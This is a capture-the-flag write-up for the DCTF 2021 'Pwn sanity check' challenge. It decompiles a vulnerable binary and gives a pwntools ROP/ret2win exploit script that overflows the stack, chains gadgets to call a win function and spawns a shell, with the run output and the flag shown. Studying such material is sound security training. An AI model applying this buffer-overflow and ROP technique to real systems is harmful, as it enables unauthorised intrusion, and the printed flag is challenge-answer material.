# DCTF 2021

## Pwn sanity check

> 100
> 
> This should take about 1337 seconds to solve.
> 
> `nc dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io 7480`
>
[pwn\_sanity\_check](pwn_sanity_check)

Tags: _pwn_ _x86-64_ _bof_ _rop_ _ret2win_


## Summary

Intended solution for a basic ROP/ret2win. 


## Analysis

### Decompile with Ghidra

```c
void vuln(void)
{
  char local_48 [60];
  int local_c;
  
  puts("tell me a joke");
  fgets(local_48,0x100,stdin);
  if (local_c == 0xdeadc0de) {
    puts("very good, here is a shell for you. ");
    shell();
  }
  else {
    puts("will this work?");
  }
  return;
}

void win(int param_1,int param_2)
{
  puts("you made it to win land, no free handouts this time, try harder");
  if (param_1 == 0xdeadbeef) {
    puts("one down, one to go!");
    if (param_2 == 0x1337c0de) {
      puts("2/2 bro good job");
      system("/bin/sh");
                    // WARNING: Subroutine does not return
      exit(0);
    }
  }
  return;
}
```

`vuln` tolls you into thinking this is an easy variable overwrite attack, but `shell` does nothing.  You'll have to smash the stack, set `rdi` and `rsi` to then call `win`.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./pwn_sanity_check')

if args.REMOTE:
    p = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io', 7480)
else:
    p = process(binary.path)

pop_rdi = next(binary.search(asm('pop rdi; ret')))
pop_rsi_r15 = next(binary.search(asm('pop rsi; pop r15; ret')))

payload  = b''
payload += 0x48 * b'A'
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(pop_rsi_r15)
payload += p64(0x1337c0de)
payload += p64(0)
payload += p64(binary.sym.win)

p.sendlineafter('joke\n',payload)
p.interactive()
```

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/dctf2021/pwn_sanity_check/pwn_sanity_check'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io on port 7480: Done
[*] Switching to interactive mode
will this work?
you made it to win land, no free handouts this time, try harder
one down, one to go!
2/2 bro good job
$ id
uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
$ cat flag.txt
dctf{Ju5t_m0v3_0n}
```
